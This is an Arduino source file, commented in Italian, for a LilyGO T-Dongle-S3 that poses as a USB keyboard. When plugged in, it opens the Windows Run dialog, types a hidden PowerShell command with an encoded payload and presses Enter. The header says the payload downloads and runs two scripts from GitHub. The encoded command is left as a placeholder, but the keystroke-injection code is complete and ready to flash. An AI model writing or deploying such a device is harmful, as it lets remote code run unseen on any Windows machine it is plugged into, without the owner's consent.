/**
 * @file  main.cpp
 * @brief T-Dongle-S3 — HID Keyboard payload
 *
 * Al plug-in apre Win+R, digita un comando PowerShell encodato in Base64
 * che scarica ed esegue i due script PS1 da GitHub.
 *
 * @board   LilyGO T-Dongle-S3 (ESP32-S3)
 * @require ESP32 Arduino Core >= 2.0.14, USB Mode = USB-OTG (TinyUSB)
 */

#include <Arduino.h>
#include "USB.h"
#include "USBHIDKeyboard.h"

// ─── CONFIGURAZIONE ────────────────────────────────────────────────────────────

// Stringa generata da genera_encoded_cmd.py — sostituisci con il tuo output
static const char ENCODED_CMD[] = "INCOLLA_QUI_LA_STRINGA_BASE64";

// Timing (ms) — aumenta su macchine lente
static constexpr uint32_t DELAY_HID_INIT    = 4000U; // attesa enumerazione USB
static constexpr uint32_t DELAY_RUN_DIALOG  = 1000U; // attesa apertura Win+R
static constexpr uint32_t DELAY_PER_CHAR    =   20U; // ritardo per carattere
static constexpr uint32_t DELAY_PRE_ENTER   =  300U; // pausa prima di Enter

// ─── OGGETTO TASTIERA ──────────────────────────────────────────────────────────

USBHIDKeyboard Keyboard;

// ─── HELPERS ──────────────────────────────────────────────────────────────────

/**
 * @brief Preme una combinazione di tasti e rilascia tutto.
 */
static void pressCombo(uint8_t k1, uint8_t k2 = 0, uint32_t holdMs = 80U) {
    Keyboard.press(k1);
    if (k2 != 0) Keyboard.press(k2);
    delay(holdMs);
    Keyboard.releaseAll();
    delay(50U);
}

/**
 * @brief Digita una stringa carattere per carattere con delay configurabile.
 *        Più affidabile di Keyboard.print() su host USB lenti.
 */
static void typeString(const char* str, uint32_t charDelay = DELAY_PER_CHAR) {
    while (*str != '\0') {
        Keyboard.print(*str);
        delay(charDelay);
        ++str;
    }
}

// ─── SETUP ────────────────────────────────────────────────────────────────────

void setup() {
    USB.begin();
    Keyboard.begin();

    // Aspetta che Windows enumeri il dispositivo HID
    delay(DELAY_HID_INIT);

    // 1. Apri finestra Esegui con Win+R
    pressCombo(KEY_LEFT_GUI, 'r');
    delay(DELAY_RUN_DIALOG);

    // 2. Digita il comando — solo caratteri alfanumerici, nessun problema layout
    typeString("powershell -WindowStyle Hidden -enc ");
    typeString(ENCODED_CMD);

    // 3. Conferma con Invio
    delay(DELAY_PRE_ENTER);
    pressCombo(KEY_RETURN);
}

// ─── LOOP ─────────────────────────────────────────────────────────────────────

void loop() {
    // Payload già consegnato nel setup — non serve fare altro
    delay(60000U);
}
